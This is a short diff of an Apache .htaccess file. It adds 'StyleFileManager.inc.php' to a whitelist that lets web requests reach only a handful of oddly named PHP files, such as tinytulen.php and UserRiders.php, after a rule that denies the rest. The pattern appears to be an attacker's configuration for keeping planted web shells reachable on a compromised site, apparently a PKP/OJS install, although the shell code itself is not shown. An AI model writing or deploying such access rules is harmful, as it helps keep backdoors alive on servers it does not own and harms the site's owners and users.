@@ -3,7 +3,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(index.php|config.style.php|fc-Styless-list.php|PKPStyle.inc.php|404.php|tinytulen.php|FilterGridInstaller.inc.php|SupplementaryFileStyleForm.inc.php|framework.php|UserRiders.php|UserRiders.php)$">
+<FilesMatch "^(index.php|config.style.php|fc-Styless-list.php|PKPStyle.inc.php|404.php|tinytulen.php|FilterGridInstaller.inc.php|SupplementaryFileStyleForm.inc.php|framework.php|UserRiders.php|UserRiders.php|StyleFileManager.inc.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
